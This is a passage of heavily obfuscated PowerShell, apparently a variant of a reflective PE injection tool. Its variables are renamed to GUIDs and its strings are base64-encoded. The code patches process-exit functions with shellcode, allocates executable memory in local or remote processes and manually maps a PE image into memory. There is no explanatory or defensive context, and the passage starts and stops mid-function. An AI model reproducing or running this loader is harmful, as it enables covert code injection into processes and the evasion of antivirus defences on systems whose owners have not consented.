					throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAFYAaQByAHQAdQBhAGwAUAByAG8AdABlAGMAdAAgAGYAYQBpAGwAZQBkAA==')))
				}
				[System.Runtime.InteropServices.Marshal]::StructureToPtr(${73e177f4b9024e9aa5d7ef43687efbca}, $WCmdLnAddr, $false)
				${a36b17e7e2e643b69f9b9e1a2bd60bb9}.VirtualProtect.Invoke($WCmdLnAddr, [UInt32]${acafad3a2a75412893cf40bcdc32329b}, [UInt32]($OldProtectFlag), [Ref]$OldProtectFlag) | Out-Null
			}
		}
		${035260d1f3b54c20b4385b7173c9c09d} = @()
		${2fa66ea5b2744a698aa136c0ee1e640b} = @() 
		[IntPtr]$MscoreeHandle = ${a36b17e7e2e643b69f9b9e1a2bd60bb9}.GetModuleHandle.Invoke($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAGMAbwByAGUAZQAuAGQAbABsAA=='))))
		if ($MscoreeHandle -eq [IntPtr]::Zero)
		{
			throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAGMAbwByAGUAZQAgAGgAYQBuAGQAbABlACAAbgB1AGwAbAA=')))
		}
		[IntPtr]$CorExitProcessAddr = ${a36b17e7e2e643b69f9b9e1a2bd60bb9}.GetProcAddress.Invoke($MscoreeHandle, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAHIARQB4AGkAdABQAHIAbwBjAGUAcwBzAA=='))))
		if ($CorExitProcessAddr -eq [IntPtr]::Zero)
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAHIARQB4AGkAdABQAHIAbwBjAGUAcwBzACAAYQBkAGQAcgBlAHMAcwAgAG4AbwB0ACAAZgBvAHUAbgBkAA==')))
		}
		${2fa66ea5b2744a698aa136c0ee1e640b} += $CorExitProcessAddr
		[IntPtr]$ExitProcessAddr = ${a36b17e7e2e643b69f9b9e1a2bd60bb9}.GetProcAddress.Invoke(${7e8c5e022873429894a5b4a7f0911dca}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGkAdABQAHIAbwBjAGUAcwBzAA=='))))
		if ($ExitProcessAddr -eq [IntPtr]::Zero)
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGkAdABQAHIAbwBjAGUAcwBzACAAYQBkAGQAcgBlAHMAcwAgAG4AbwB0ACAAZgBvAHUAbgBkAA==')))
		}
		${2fa66ea5b2744a698aa136c0ee1e640b} += $ExitProcessAddr
		[UInt32]$OldProtectFlag = 0
		foreach ($ProcExitFunctionAddr in ${2fa66ea5b2744a698aa136c0ee1e640b})
		{
			${cce233ca856f44cb8715cdbb16f83888} = $ProcExitFunctionAddr
			[Byte[]]$Shellcode1 = @(0xbb)
			[Byte[]]$Shellcode2 = @(0xc6, 0x03, 0x01, 0x83, 0xec, 0x20, 0x83, 0xe4, 0xc0, 0xbb)
			if (${acafad3a2a75412893cf40bcdc32329b} -eq 8)
			{
				[Byte[]]$Shellcode1 = @(0x48, 0xbb)
				[Byte[]]$Shellcode2 = @(0xc6, 0x03, 0x01, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xbb)
			}
			[Byte[]]$Shellcode3 = @(0xff, 0xd3)
			${2eb9cd199aa248a290dd98c60940f2a2} = $Shellcode1.Length + ${acafad3a2a75412893cf40bcdc32329b} + $Shellcode2.Length + ${acafad3a2a75412893cf40bcdc32329b} + $Shellcode3.Length
			[IntPtr]$ExitThreadAddr = ${a36b17e7e2e643b69f9b9e1a2bd60bb9}.GetProcAddress.Invoke(${7e8c5e022873429894a5b4a7f0911dca}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGkAdABUAGgAcgBlAGEAZAA='))))
			if ($ExitThreadAddr -eq [IntPtr]::Zero)
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGkAdABUAGgAcgBlAGEAZAAgAGEAZABkAHIAZQBzAHMAIABuAG8AdAAgAGYAbwB1AG4AZAA=')))
			}
			${aa485f490a6d4dbcb08ed9a0e7f41001} = ${a36b17e7e2e643b69f9b9e1a2bd60bb9}.VirtualProtect.Invoke($ProcExitFunctionAddr, [UInt32]${2eb9cd199aa248a290dd98c60940f2a2}, [UInt32]${bf6addb5678a4306bbd927c2e94d4ede}.PAGE_EXECUTE_READWRITE, [Ref]$OldProtectFlag)
			if (${aa485f490a6d4dbcb08ed9a0e7f41001} -eq $false)
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAFYAaQByAHQAdQBhAGwAUAByAG8AdABlAGMAdAAgAGYAYQBpAGwAZQBkAA==')))
			}
			${f4b89afe1fcb44918cb8abe186919e8d} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${2eb9cd199aa248a290dd98c60940f2a2})
			${a36b17e7e2e643b69f9b9e1a2bd60bb9}.memcpy.Invoke(${f4b89afe1fcb44918cb8abe186919e8d}, $ProcExitFunctionAddr, [UInt64]${2eb9cd199aa248a290dd98c60940f2a2}) | Out-Null
			${035260d1f3b54c20b4385b7173c9c09d} += ,($ProcExitFunctionAddr, ${f4b89afe1fcb44918cb8abe186919e8d}, ${2eb9cd199aa248a290dd98c60940f2a2})
			Write-BytesToMemory -ec206491ad3f4128af1a77bc1c4928e7 $Shellcode1 -af6d51d057d949f4a6df10d4847caeef ${cce233ca856f44cb8715cdbb16f83888}
			${cce233ca856f44cb8715cdbb16f83888} = Add-SignedIntAsUnsigned ${cce233ca856f44cb8715cdbb16f83888} ($Shellcode1.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr(${c234f2cf0d9b4e839141a97336592954}, ${cce233ca856f44cb8715cdbb16f83888}, $false)
			${cce233ca856f44cb8715cdbb16f83888} = Add-SignedIntAsUnsigned ${cce233ca856f44cb8715cdbb16f83888} ${acafad3a2a75412893cf40bcdc32329b}
			Write-BytesToMemory -ec206491ad3f4128af1a77bc1c4928e7 $Shellcode2 -af6d51d057d949f4a6df10d4847caeef ${cce233ca856f44cb8715cdbb16f83888}
			${cce233ca856f44cb8715cdbb16f83888} = Add-SignedIntAsUnsigned ${cce233ca856f44cb8715cdbb16f83888} ($Shellcode2.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($ExitThreadAddr, ${cce233ca856f44cb8715cdbb16f83888}, $false)
			${cce233ca856f44cb8715cdbb16f83888} = Add-SignedIntAsUnsigned ${cce233ca856f44cb8715cdbb16f83888} ${acafad3a2a75412893cf40bcdc32329b}
			Write-BytesToMemory -ec206491ad3f4128af1a77bc1c4928e7 $Shellcode3 -af6d51d057d949f4a6df10d4847caeef ${cce233ca856f44cb8715cdbb16f83888}
			${a36b17e7e2e643b69f9b9e1a2bd60bb9}.VirtualProtect.Invoke($ProcExitFunctionAddr, [UInt32]${2eb9cd199aa248a290dd98c60940f2a2}, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
		}
		echo ${035260d1f3b54c20b4385b7173c9c09d}
	}
	Function Copy-ArrayOfMemAddresses
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Array[]]
		${b8c3444574d94e178e88580238a27e8f},
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		${a36b17e7e2e643b69f9b9e1a2bd60bb9},
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		${bf6addb5678a4306bbd927c2e94d4ede}
		)
		[UInt32]$OldProtectFlag = 0
		foreach ($Info in ${b8c3444574d94e178e88580238a27e8f})
		{
			${aa485f490a6d4dbcb08ed9a0e7f41001} = ${a36b17e7e2e643b69f9b9e1a2bd60bb9}.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]${bf6addb5678a4306bbd927c2e94d4ede}.PAGE_EXECUTE_READWRITE, [Ref]$OldProtectFlag)
			if (${aa485f490a6d4dbcb08ed9a0e7f41001} -eq $false)
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAFYAaQByAHQAdQBhAGwAUAByAG8AdABlAGMAdAAgAGYAYQBpAGwAZQBkAA==')))
			}
			${a36b17e7e2e643b69f9b9e1a2bd60bb9}.memcpy.Invoke($Info[0], $Info[1], [UInt64]$Info[2]) | Out-Null
			${a36b17e7e2e643b69f9b9e1a2bd60bb9}.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
		}
	}
	Function Get-MemoryProcAddress
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[IntPtr]
		${ae6ce24b24854af29680b1afe7ddb45a},
		[Parameter(Position = 1, Mandatory = $true)]
		[String]
		${ef958cd51d3144759d0cfc0a4b45bd60}
		)
		${c3c389d397344cdcb031960f029f7926} = Get-Win32Types
		${bf6addb5678a4306bbd927c2e94d4ede} = Get-Win32Constants
		${c8edec2d3caf433f9746e28faa91f6ff} = Get-PEDetailedInfo -ae6ce24b24854af29680b1afe7ddb45a ${ae6ce24b24854af29680b1afe7ddb45a} -c3c389d397344cdcb031960f029f7926 ${c3c389d397344cdcb031960f029f7926} -bf6addb5678a4306bbd927c2e94d4ede ${bf6addb5678a4306bbd927c2e94d4ede}
		if (${c8edec2d3caf433f9746e28faa91f6ff}.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.Size -eq 0)
		{
			return [IntPtr]::Zero
		}
		${f992186b077744d6b7b4725e6295cbb2} = Add-SignedIntAsUnsigned (${ae6ce24b24854af29680b1afe7ddb45a}) (${c8edec2d3caf433f9746e28faa91f6ff}.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.VirtualAddress)
		${8bab18a87a0e41a2bc6271f573a092be} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${f992186b077744d6b7b4725e6295cbb2}, [Type]${c3c389d397344cdcb031960f029f7926}.IMAGE_EXPORT_DIRECTORY)
		for (${4c7705bd7e4a4adbb1ff54055067af60} = 0; ${4c7705bd7e4a4adbb1ff54055067af60} -lt ${8bab18a87a0e41a2bc6271f573a092be}.NumberOfNames; ${4c7705bd7e4a4adbb1ff54055067af60}++)
		{
			${65ee2c38ef2142f688c8aa73e3f38608} = Add-SignedIntAsUnsigned (${ae6ce24b24854af29680b1afe7ddb45a}) (${8bab18a87a0e41a2bc6271f573a092be}.AddressOfNames + (${4c7705bd7e4a4adbb1ff54055067af60} * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
			${4f84dc526c214d34bc26fe5306d8da86} = Add-SignedIntAsUnsigned (${ae6ce24b24854af29680b1afe7ddb45a}) ([System.Runtime.InteropServices.Marshal]::PtrToStructure(${65ee2c38ef2142f688c8aa73e3f38608}, [Type][UInt32]))
			${4f2047dd09dc4b78ae4338e2b0e1f64e} = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi(${4f84dc526c214d34bc26fe5306d8da86})
			if (${4f2047dd09dc4b78ae4338e2b0e1f64e} -ceq ${ef958cd51d3144759d0cfc0a4b45bd60})
			{
				${f68b96592b0244db9bcd1e9bda5a6801} = Add-SignedIntAsUnsigned (${ae6ce24b24854af29680b1afe7ddb45a}) (${8bab18a87a0e41a2bc6271f573a092be}.AddressOfNameOrdinals + (${4c7705bd7e4a4adbb1ff54055067af60} * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16])))
				${a01de47e2f9b402f9a3c19a70003fd29} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${f68b96592b0244db9bcd1e9bda5a6801}, [Type][UInt16])
				${405d1e0c6f30483cbaf8b711e4a48ad9} = Add-SignedIntAsUnsigned (${ae6ce24b24854af29680b1afe7ddb45a}) (${8bab18a87a0e41a2bc6271f573a092be}.AddressOfFunctions + (${a01de47e2f9b402f9a3c19a70003fd29} * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
				${49e5b3c2638e441886caabe7db5e36fe} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${405d1e0c6f30483cbaf8b711e4a48ad9}, [Type][UInt32])
				return Add-SignedIntAsUnsigned (${ae6ce24b24854af29680b1afe7ddb45a}) (${49e5b3c2638e441886caabe7db5e36fe})
			}
		}
		return [IntPtr]::Zero
	}
	Function Invoke-MemoryLoadLibrary
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true )]
		[Byte[]]
		${dc16372125974a299ad4aa82bcfa6b2d},
		[Parameter(Position = 1, Mandatory = $false)]
		[String]
		${bb61a355ebca4b4caf1b861559415a52},
		[Parameter(Position = 2, Mandatory = $false)]
		[IntPtr]
		${bc96a39c79d24a35b88ba52e143fe2a2}
		)
		${acafad3a2a75412893cf40bcdc32329b} = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		${bf6addb5678a4306bbd927c2e94d4ede} = Get-Win32Constants
		${a36b17e7e2e643b69f9b9e1a2bd60bb9} = Get-Win32Functions
		${c3c389d397344cdcb031960f029f7926} = Get-Win32Types
		${0d562d8a696e463abdc2da2b4cc9ed68} = $false
		if ((${bc96a39c79d24a35b88ba52e143fe2a2} -ne $null) -and (${bc96a39c79d24a35b88ba52e143fe2a2} -ne [IntPtr]::Zero))
		{
			${0d562d8a696e463abdc2da2b4cc9ed68} = $true
		}
		Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAdABpAG4AZwAgAGIAYQBzAGkAYwAgAFAARQAgAGkAbgBmAG8AcgBtAGEAdABpAG8AbgAgAGYAcgBvAG0AIAB0AGgAZQAgAGYAaQBsAGUA')))
		${c8edec2d3caf433f9746e28faa91f6ff} = Get-PEBasicInfo -dc16372125974a299ad4aa82bcfa6b2d ${dc16372125974a299ad4aa82bcfa6b2d} -c3c389d397344cdcb031960f029f7926 ${c3c389d397344cdcb031960f029f7926}
		${ed5fe4ebfc354342a21d3474bca3b962} = ${c8edec2d3caf433f9746e28faa91f6ff}.OriginalImageBase
		${0aa4be5a31074bf6af02e6918b603e6c} = $true
		if (([Int] ${c8edec2d3caf433f9746e28faa91f6ff}.DllCharacteristics -band ${bf6addb5678a4306bbd927c2e94d4ede}.IMAGE_DLLCHARACTERISTICS_NX_COMPAT) -ne ${bf6addb5678a4306bbd927c2e94d4ede}.IMAGE_DLLCHARACTERISTICS_NX_COMPAT)
		{
			Write-Warning $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABFACAAaQBzACAAbgBvAHQAIABjAG8AbQBwAGEAdABpAGIAbABlACAAdwBpAHQAaAAgAEQARQBQACwAIABtAGkAZwBoAHQAIABjAGEAdQBzAGUAIABpAHMAcwB1AGUAcwA='))) -WarningAction Continue
			${0aa4be5a31074bf6af02e6918b603e6c} = $false
		}
		${db35981d56bd4a338ab097efcd08af22} = $true
		if (${0d562d8a696e463abdc2da2b4cc9ed68} -eq $true)
		{
			${7e8c5e022873429894a5b4a7f0911dca} = ${a36b17e7e2e643b69f9b9e1a2bd60bb9}.GetModuleHandle.Invoke($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('awBlAHIAbgBlAGwAMwAyAC4AZABsAGwA'))))
			${94d54b9f2d6c4bfd9a1438bad15bbcc2} = ${a36b17e7e2e643b69f9b9e1a2bd60bb9}.GetProcAddress.Invoke(${7e8c5e022873429894a5b4a7f0911dca}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAFcAbwB3ADYANABQAHIAbwBjAGUAcwBzAA=='))))
			if (${94d54b9f2d6c4bfd9a1438bad15bbcc2} -eq [IntPtr]::Zero)
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAHUAbABkAG4AJwB0ACAAbABvAGMAYQB0AGUAIABJAHMAVwBvAHcANgA0AFAAcgBvAGMAZQBzAHMAIABmAHUAbgBjAHQAaQBvAG4AIAB0AG8AIABkAGUAdABlAHIAbQBpAG4AZQAgAGkAZgAgAHQAYQByAGcAZQB0ACAAcAByAG8AYwBlAHMAcwAgAGkAcwAgADMAMgBiAGkAdAAgAG8AcgAgADYANABiAGkAdAA=')))
			}
			[Bool]$Wow64Process = $false
			${aa485f490a6d4dbcb08ed9a0e7f41001} = ${a36b17e7e2e643b69f9b9e1a2bd60bb9}.IsWow64Process.Invoke(${bc96a39c79d24a35b88ba52e143fe2a2}, [Ref]$Wow64Process)
			if (${aa485f490a6d4dbcb08ed9a0e7f41001} -eq $false)
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAEkAcwBXAG8AdwA2ADQAUAByAG8AYwBlAHMAcwAgAGYAYQBpAGwAZQBkAA==')))
			}
			if (($Wow64Process -eq $true) -or (($Wow64Process -eq $false) -and ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4)))
			{
				${db35981d56bd4a338ab097efcd08af22} = $false
			}
			${56fd1aea4f0b4f5a8fc3f4cc5b9135d5} = $true
			if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
			{
				${56fd1aea4f0b4f5a8fc3f4cc5b9135d5} = $false
			}
			if (${56fd1aea4f0b4f5a8fc3f4cc5b9135d5} -ne ${db35981d56bd4a338ab097efcd08af22})
			{
				throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFMAaABlAGwAbAAgAG0AdQBzAHQAIABiAGUAIABzAGEAbQBlACAAYQByAGMAaABpAHQAZQBjAHQAdQByAGUAIAAoAHgAOAA2AC8AeAA2ADQAKQAgAGEAcwAgAFAARQAgAGIAZQBpAG4AZwAgAGwAbwBhAGQAZQBkACAAYQBuAGQAIAByAGUAbQBvAHQAZQAgAHAAcgBvAGMAZQBzAHMA')))
			}
		}
		else
		{
			if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
			{
				${db35981d56bd4a338ab097efcd08af22} = $false
			}
		}
		if (${db35981d56bd4a338ab097efcd08af22} -ne ${c8edec2d3caf433f9746e28faa91f6ff}.PE64Bit)
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABFACAAcABsAGEAdABmAG8AcgBtACAAZABvAGUAcwBuACcAdAAgAG0AYQB0AGMAaAAgAHQAaABlACAAYQByAGMAaABpAHQAZQBjAHQAdQByAGUAIABvAGYAIAB0AGgAZQAgAHAAcgBvAGMAZQBzAHMAIABpAHQAIABpAHMAIABiAGUAaQBuAGcAIABsAG8AYQBkAGUAZAAgAGkAbgAgACgAMwAyAC8ANgA0AGIAaQB0ACkA')))
		}
		Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBsAGwAbwBjAGEAdABpAG4AZwAgAG0AZQBtAG8AcgB5ACAAZgBvAHIAIAB0AGgAZQAgAFAARQAgAGEAbgBkACAAdwByAGkAdABlACAAaQB0AHMAIABoAGUAYQBkAGUAcgBzACAAdABvACAAbQBlAG0AbwByAHkA')))
		[IntPtr]$LoadAddr = [IntPtr]::Zero
		if (([Int] ${c8edec2d3caf433f9746e28faa91f6ff}.DllCharacteristics -band ${bf6addb5678a4306bbd927c2e94d4ede}.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE) -ne ${bf6addb5678a4306bbd927c2e94d4ede}.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE)
		{
			Write-Warning $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABFACAAZgBpAGwAZQAgAGIAZQBpAG4AZwAgAHIAZQBmAGwAZQBjAHQAaQB2AGUAbAB5ACAAbABvAGEAZABlAGQAIABpAHMAIABuAG8AdAAgAEEAUwBMAFIAIABjAG8AbQBwAGEAdABpAGIAbABlAC4AIABJAGYAIAB0AGgAZQAgAGwAbwBhAGQAaQBuAGcAIABmAGEAaQBsAHMALAAgAHQAcgB5ACAAcgBlAHMAdABhAHIAdABpAG4AZwAgAFAAbwB3AGUAcgBTAGgAZQBsAGwAIABhAG4AZAAgAHQAcgB5AGkAbgBnACAAYQBnAGEAaQBuAA=='))) -WarningAction Continue
			[IntPtr]$LoadAddr = ${ed5fe4ebfc354342a21d3474bca3b962}
		}
		${ae6ce24b24854af29680b1afe7ddb45a} = [IntPtr]::Zero				
		${402f31e6c94945249a36d4b37bc43339} = [IntPtr]::Zero		
		if (${0d562d8a696e463abdc2da2b4cc9ed68} -eq $true)
		{
			${ae6ce24b24854af29680b1afe7ddb45a} = ${a36b17e7e2e643b69f9b9e1a2bd60bb9}.VirtualAlloc.Invoke([IntPtr]::Zero, [UIntPtr]${c8edec2d3caf433f9746e28faa91f6ff}.SizeOfImage, ${bf6addb5678a4306bbd927c2e94d4ede}.MEM_COMMIT -bor ${bf6addb5678a4306bbd927c2e94d4ede}.MEM_RESERVE, ${bf6addb5678a4306bbd927c2e94d4ede}.PAGE_READWRITE)
			${402f31e6c94945249a36d4b37bc43339} = ${a36b17e7e2e643b69f9b9e1a2bd60bb9}.VirtualAllocEx.Invoke(${bc96a39c79d24a35b88ba52e143fe2a2}, $LoadAddr, [UIntPtr]${c8edec2d3caf433f9746e28faa91f6ff}.SizeOfImage, ${bf6addb5678a4306bbd927c2e94d4ede}.MEM_COMMIT -bor ${bf6addb5678a4306bbd927c2e94d4ede}.MEM_RESERVE, ${bf6addb5678a4306bbd927c2e94d4ede}.PAGE_EXECUTE_READWRITE)
			if (${402f31e6c94945249a36d4b37bc43339} -eq [IntPtr]::Zero)
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABhAGwAbABvAGMAYQB0AGUAIABtAGUAbQBvAHIAeQAgAGkAbgAgAHQAaABlACAAcgBlAG0AbwB0AGUAIABwAHIAbwBjAGUAcwBzAC4AIABJAGYAIAB0AGgAZQAgAFAARQAgAGIAZQBpAG4AZwAgAGwAbwBhAGQAZQBkACAAZABvAGUAcwBuACcAdAAgAHMAdQBwAHAAbwByAHQAIABBAFMATABSACwAIABpAHQAIABjAG8AdQBsAGQAIABiAGUAIAB0AGgAYQB0ACAAdABoAGUAIAByAGUAcQB1AGUAcwB0AGUAZAAgAGIAYQBzAGUAIABhAGQAZAByAGUAcwBzACAAbwBmACAAdABoAGUAIABQAEUAIABpAHMAIABhAGwAcgBlAGEAZAB5ACAAaQBuACAAdQBzAGUA')))
			}
		}
		else
		{
			if (${0aa4be5a31074bf6af02e6918b603e6c} -eq $true)
			{
				${ae6ce24b24854af29680b1afe7ddb45a} = ${a36b17e7e2e643b69f9b9e1a2bd60bb9}.VirtualAlloc.Invoke($LoadAddr, [UIntPtr]${c8edec2d3caf433f9746e28faa91f6ff}.SizeOfImage, ${bf6addb5678a4306bbd927c2e94d4ede}.MEM_COMMIT -bor ${bf6addb5678a4306bbd927c2e94d4ede}.MEM_RESERVE, ${bf6addb5678a4306bbd927c2e94d4ede}.PAGE_READWRITE)
			}
			else
			{
				${ae6ce24b24854af29680b1afe7ddb45a} = ${a36b17e7e2e643b69f9b9e1a2bd60bb9}.VirtualAlloc.Invoke($LoadAddr, [UIntPtr]${c8edec2d3caf433f9746e28faa91f6ff}.SizeOfImage, ${bf6addb5678a4306bbd927c2e94d4ede}.MEM_COMMIT -bor ${bf6addb5678a4306bbd927c2e94d4ede}.MEM_RESERVE, ${bf6addb5678a4306bbd927c2e94d4ede}.PAGE_EXECUTE_READWRITE)
			}
			${402f31e6c94945249a36d4b37bc43339} = ${ae6ce24b24854af29680b1afe7ddb45a}
		}
		[IntPtr]${6ad81c5815444adbae4ace2ffc4310ec} = Add-SignedIntAsUnsigned (${ae6ce24b24854af29680b1afe7ddb45a}) ([Int64]${c8edec2d3caf433f9746e28faa91f6ff}.SizeOfImage)
		if (${ae6ce24b24854af29680b1afe7ddb45a} -eq [IntPtr]::Zero)
		{ 
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBpAHIAdAB1AGEAbABBAGwAbABvAGMAIABmAGEAaQBsAGUAZAAgAHQAbwAgAGEAbABsAG8AYwBhAHQAZQAgAG0AZQBtAG8AcgB5ACAAZgBvAHIAIABQAEUALgAgAEkAZgAgAFAARQAgAGkAcwAgAG4AbwB0ACAAQQBTAEwAUgAgAGMAbwBtAHAAYQB0AGkAYgBsAGUALAAgAHQAcgB5ACAAcgB1AG4AbgBpAG4AZwAgAHQAaABlACAAcwBjAHIAaQBwAHQAIABpAG4AIABhACAAbgBlAHcAIABQAG8AdwBlAHIAUwBoAGUAbABsACAAcAByAG8AYwBlAHMAcwAgACgAdABoAGUAIABuAGUAdwAgAFAAbwB3AGUAcgBTAGgAZQBsAGwAIABwAHIAbwBjAGUAcwBzACAAdwBpAGwAbAAgAGgAYQB2AGUAIABhACAAZABpAGYAZgBlAHIAZQBuAHQAIABtAGUAbQBvAHIAeQAgAGwAYQB5AG8AdQB0ACwAIABzAG8AIAB0AGgAZQAgAGEAZABkAHIAZQBzAHMAIAB0AGgAZQAgAFAARQAgAHcAYQBuAHQAcwAgAG0AaQBnAGgAdAAgAGIAZQAgAGYAcgBlAGUAKQAuAA==')))
		}		
		[System.Runtime.InteropServices.Marshal]::Copy(${dc16372125974a299ad4aa82bcfa6b2d}, 0, ${ae6ce24b24854af29680b1afe7ddb45a}, ${c8edec2d3caf433f9746e28faa91f6ff}.SizeOfHeaders) | Out-Null
		Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAdABpAG4AZwAgAGQAZQB0AGEAaQBsAGUAZAAgAFAARQAgAGkAbgBmAG8AcgBtAGEAdABpAG8AbgAgAGYAcgBvAG0AIAB0AGgAZQAgAGgAZQBhAGQAZQByAHMAIABsAG8AYQBkAGUAZAAgAGkAbgAgAG0AZQBtAG8AcgB5AA==')))
		${c8edec2d3caf433f9746e28faa91f6ff} = Get-PEDetailedInfo -ae6ce24b24854af29680b1afe7ddb45a ${ae6ce24b24854af29680b1afe7ddb45a} -c3c389d397344cdcb031960f029f7926 ${c3c389d397344cdcb031960f029f7926} -bf6addb5678a4306bbd927c2e94d4ede ${bf6addb5678a4306bbd927c2e94d4ede}
		${c8edec2d3caf433f9746e28faa91f6ff} | Add-Member -MemberType NoteProperty -Name EndAddress -Value ${6ad81c5815444adbae4ace2ffc4310ec}
		${c8edec2d3caf433f9746e28faa91f6ff} | Add-Member -MemberType NoteProperty -Name EffectivePEHandle -Value ${402f31e6c94945249a36d4b37bc43339}
		Write-Verbose "StartAddress: ${ae6ce24b24854af29680b1afe7ddb45a}    EndAddress: ${6ad81c5815444adbae4ace2ffc4310ec}"
		Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAHAAeQAgAFAARQAgAHMAZQBjAHQAaQBvAG4AcwAgAGkAbgAgAHQAbwAgAG0AZQBtAG8AcgB5AA==')))
		Copy-Sections -dc16372125974a299ad4aa82bcfa6b2d ${dc16372125974a299ad4aa82bcfa6b2d} -c8edec2d3caf433f9746e28faa91f6ff ${c8edec2d3caf433f9746e28faa91f6ff} -a36b17e7e2e643b69f9b9e1a2bd60bb9 ${a36b17e7e2e643b69f9b9e1a2bd60bb9} -c3c389d397344cdcb031960f029f7926 ${c3c389d397344cdcb031960f029f7926}
		Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBwAGQAYQB0AGUAIABtAGUAbQBvAHIAeQAgAGEAZABkAHIAZQBzAHMAZQBzACAAYgBhAHMAZQBkACAAbwBuACAAdwBoAGUAcgBlACAAdABoAGUAIABQAEUAIAB3AGEAcwAgAGEAYwB0AHUAYQBsAGwAeQAgAGwAbwBhAGQAZQBkACAAaQBuACAAbQBlAG0AbwByAHkA')))
		Update-MemoryAddresses -c8edec2d3caf433f9746e28faa91f6ff ${c8edec2d3caf433f9746e28faa91f6ff} -ed5fe4ebfc354342a21d3474bca3b962 ${ed5fe4ebfc354342a21d3474bca3b962} -bf6addb5678a4306bbd927c2e94d4ede ${bf6addb5678a4306bbd927c2e94d4ede} -c3c389d397344cdcb031960f029f7926 ${c3c389d397344cdcb031960f029f7926}
		Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBtAHAAbwByAHQAIABEAEwATAAnAHMAIABuAGUAZQBkAGUAZAAgAGIAeQAgAHQAaABlACAAUABFACAAdwBlACAAYQByAGUAIABsAG8AYQBkAGkAbgBnAA==')))
		if (${0d562d8a696e463abdc2da2b4cc9ed68} -eq $true)
		{
			Import-DllImports -c8edec2d3caf433f9746e28faa91f6ff ${c8edec2d3caf433f9746e28faa91f6ff} -a36b17e7e2e643b69f9b9e1a2bd60bb9 ${a36b17e7e2e643b69f9b9e1a2bd60bb9} -c3c389d397344cdcb031960f029f7926 ${c3c389d397344cdcb031960f029f7926} -bf6addb5678a4306bbd927c2e94d4ede ${bf6addb5678a4306bbd927c2e94d4ede} -bc96a39c79d24a35b88ba52e143fe2a2 ${bc96a39c79d24a35b88ba52e143fe2a2}
		}
		else
		{
			Import-DllImports -c8edec2d3caf433f9746e28faa91f6ff ${c8edec2d3caf433f9746e28faa91f6ff} -a36b17e7e2e643b69f9b9e1a2bd60bb9 ${a36b17e7e2e643b69f9b9e1a2bd60bb9} -c3c389d397344cdcb031960f029f7926 ${c3c389d397344cdcb031960f029f7926} -bf6addb5678a4306bbd927c2e94d4ede ${bf6addb5678a4306bbd927c2e94d4ede}
		}
		if (${0d562d8a696e463abdc2da2b4cc9ed68} -eq $false)
		{
			if (${0aa4be5a31074bf6af02e6918b603e6c} -eq $true)
			{
